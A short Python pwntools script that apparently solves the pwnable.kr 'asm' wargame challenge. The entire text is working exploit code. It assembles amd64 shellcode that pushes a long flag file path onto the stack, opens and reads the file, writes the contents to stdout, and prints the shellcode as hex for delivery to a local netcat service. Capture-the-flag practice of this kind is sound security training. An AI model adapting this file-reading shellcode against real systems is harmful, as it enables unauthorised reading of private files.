from pwn import *

context(arch='amd64',os='linux')

# /home/asm/FLAG_FILE has fake flag... But, file name is same.
assembly = shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
assembly += shellcraft.open('rsp', 0, 0)
assembly += shellcraft.read('rax','rsp',256)
assembly += shellcraft.write(1, 'rsp', 256)

print enhex(asm(assembly))

# Only work with the command, 'nc 0.0.0.0 9026', in localhost
